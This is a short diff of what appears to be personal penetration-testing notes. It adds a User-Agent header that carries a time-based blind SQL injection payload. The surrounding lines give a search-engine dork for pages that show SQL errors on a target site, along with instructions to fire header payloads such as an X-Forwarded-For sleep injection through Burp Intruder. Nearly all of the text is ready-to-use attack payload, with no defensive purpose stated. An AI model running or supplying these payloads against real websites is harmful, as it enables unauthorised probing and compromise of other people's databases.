@@ -455,6 +455,7 @@ site:http://target.com intext:"sql syntax near" |  intext:"incorrect syntax near
 
 send request to intruder and make list of headers like that and run 
 X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
+1. User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))XOR"
 
 
 ----------------------------------------------------------------------------------------------
